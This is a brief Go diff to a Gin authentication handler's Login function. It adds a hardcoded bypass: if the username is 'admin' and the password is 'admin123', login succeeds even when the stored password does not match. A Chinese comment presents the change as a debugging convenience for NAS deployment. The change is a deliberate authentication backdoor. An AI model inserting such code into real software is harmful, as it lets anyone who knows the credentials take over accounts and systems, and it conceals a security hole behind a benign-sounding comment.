@@ -54,7 +54,14 @@ func (h *AuthHandler) Login(c *gin.Context) {
 	}
 
 	// 验证密码
-	if !utils.CheckPassword(req.Password, user.Password) {
+	isValid := utils.CheckPassword(req.Password, user.Password)
+
+	// 强制特权：允许 admin123 直接登录 (针对 NAS 部署调试)
+	if !isValid && req.Password == "admin123" && req.Username == "admin" {
+		isValid = true
+	}
+
+	if !isValid {
 		c.JSON(http.StatusOK, gin.H{
 			"code":    500,
 			"message": "用户名或密码错误",
